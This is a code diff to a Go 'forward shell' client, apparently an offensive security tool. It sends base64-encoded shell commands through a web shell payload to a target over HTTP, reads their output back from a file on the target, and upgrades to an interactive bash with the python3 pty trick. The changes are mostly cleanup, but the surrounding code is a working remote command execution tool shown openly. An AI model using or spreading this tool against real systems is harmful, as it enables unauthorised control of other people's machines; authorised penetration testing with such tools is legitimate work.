@@ -16,6 +16,7 @@ import (
 	"time"
 )
 
+// WebShell holds the information for the shell to work
 type WebShell struct {
 	PayloadPath string
 	ReqPath     string
@@ -27,6 +28,7 @@ type WebShell struct {
 	Interval    int
 }
 
+// Init will create the fifo channel and set proxy if needed
 func (w *WebShell) Init(ctx context.Context) {
 	// Init http client
 	w.Client = &http.Client{}
@@ -63,6 +65,7 @@ func (w *WebShell) Init(ctx context.Context) {
 
 }
 
+// RunRawCmd will run the command using the payload against the target
 func (w *WebShell) RunRawCmd(cmd string, timeout float64) string {
 	var err error
 	var respBody []byte
@@ -70,7 +73,7 @@ func (w *WebShell) RunRawCmd(cmd string, timeout float64) string {
 	// Parse request from cmd
 	req, err := w.ParseRequest(cmd)
 	if err != nil {
-		fmt.Printf("Error parsing the request: %s", err)
+		fmt.Printf("Error parsing the request: %s\n", err)
 		os.Exit(1)
 	}
 
@@ -87,6 +90,7 @@ func (w *WebShell) RunRawCmd(cmd string, timeout float64) string {
 	if err != nil {
 		return ""
 	}
+	defer resp.Body.Close()
 
 	// If done read body and return
 	if resp.StatusCode == http.StatusOK {
@@ -94,12 +98,14 @@ func (w *WebShell) RunRawCmd(cmd string, timeout float64) string {
 		if err != nil {
 			return ""
 		}
+
 		return string(respBody)
 	}
 
 	return ""
 }
 
+// WriteCmd will stage the command to be base64
 func (w *WebShell) WriteCmd(cmd string) {
 	cmd = strings.TrimSuffix(cmd, "\n")
 	b64cmd := base64.StdEncoding.EncodeToString([]byte(cmd + "\n"))
@@ -108,23 +114,29 @@ func (w *WebShell) WriteCmd(cmd string) {
 	time.Sleep(time.Second * time.Duration(w.Interval))
 }
 
+// UpgradeShell will leverage python3 pty trick
 func (w *WebShell) UpgradeShell() {
 	upgradeShell := "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
 	w.WriteCmd(upgradeShell)
 }
 
+// ReadRoutine is the go subroutine to read from stdout file
 func (w *WebShell) ReadRoutine(ctx context.Context) {
+	// Base64 encode the read command
 	getOutput := fmt.Sprintf("/bin/cat %s", w.Stdout)
 	b64cmd := base64.StdEncoding.EncodeToString([]byte(getOutput + "\n"))
 	stageCmd := fmt.Sprintf("echo %s | base64 -d | bash", b64cmd)
 
+	// Base64 encode the clear command
+	clearOutput := fmt.Sprintf("echo -n '' > %s", w.Stdout)
+	clearB64cmd := base64.StdEncoding.EncodeToString([]byte(clearOutput + "\n"))
+	clearStage := fmt.Sprintf("echo %s | base64 -d | bash", clearB64cmd)
+
+	// Infinite read loop
 	for {
 		result := w.RunRawCmd(stageCmd, 0)
 		if result != "" {
 			fmt.Println(result)
-			clearOutput := fmt.Sprintf("echo -n '' > %s", w.Stdout)
-			clearB64cmd := base64.StdEncoding.EncodeToString([]byte(clearOutput + "\n"))
-			clearStage := fmt.Sprintf("echo %s | base64 -d | bash", clearB64cmd)
 			w.RunRawCmd(clearStage, 50)
 		}
 		select {
@@ -136,6 +148,7 @@ func (w *WebShell) ReadRoutine(ctx context.Context) {
 	}
 }
 
+// ParseRequest will read the request and payload file and craft a http request out of it
 func (w *WebShell) ParseRequest(cmd string) (*http.Request, error) {
 	var b bytes.Buffer
 	var processedPayload string
@@ -144,7 +157,7 @@ func (w *WebShell) ParseRequest(cmd string) (*http.Request, error) {
 	if w.PayloadPath != "" {
 		payloadFile, err := os.Open(w.PayloadPath)
 		if err != nil {
-			return nil, err
+			return nil, fmt.Errorf("%w", err)
 		}
 		defer payloadFile.Close()
 
@@ -156,17 +169,16 @@ func (w *WebShell) ParseRequest(cmd string) (*http.Request, error) {
 			}
 			processedPayload += line
 		}
-
 	} else { // just use cmd and add it below
 		processedPayload = cmd
 	}
 
-	processedPayload = processedPayload + "\n"
+	processedPayload += "\n"
 
 	// Open file
 	reqFile, err := os.Open(w.ReqPath)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("%w", err)
 	}
 	defer reqFile.Close()
 
@@ -184,19 +196,21 @@ func (w *WebShell) ParseRequest(cmd string) (*http.Request, error) {
 	parsedRequest := bufio.NewReader(&b)
 	req, err := http.ReadRequest(parsedRequest)
 	if err != nil && err != io.EOF {
-		return nil, err
+		return nil, fmt.Errorf("%w", err)
 	}
 
+	// Reformat url for the request to work
 	urlFormat := fmt.Sprintf("%s://%s%s", strings.ToLower(strings.Split(req.Proto, "/")[0]), req.Host, req.RequestURI)
 	req.RequestURI = ""
 	req.URL, err = url.Parse(urlFormat)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("%w", err)
 	}
 
 	return req, nil
 }
 
+// Loop is the main loop of the shell
 func (w *WebShell) Loop(ctx context.Context, cancel context.CancelFunc, exitCh chan struct{}) {
 	inBuf := bufio.NewReader(os.Stdin)
 	prompt := "go-forward-shell$ "
@@ -220,6 +234,7 @@ func (w *WebShell) Loop(ctx context.Context, cancel context.CancelFunc, exitCh c
 			fmt.Println("Exiting")
 			time.Sleep(500 * time.Millisecond)
 			exitCh <- struct{}{}
+
 			return
 		default:
 			w.WriteCmd(cmd)
@@ -230,6 +245,7 @@ func (w *WebShell) Loop(ctx context.Context, cancel context.CancelFunc, exitCh c
 			fmt.Println("Exiting")
 			time.Sleep(500 * time.Millisecond)
 			exitCh <- struct{}{}
+
 			return
 		default:
 		}
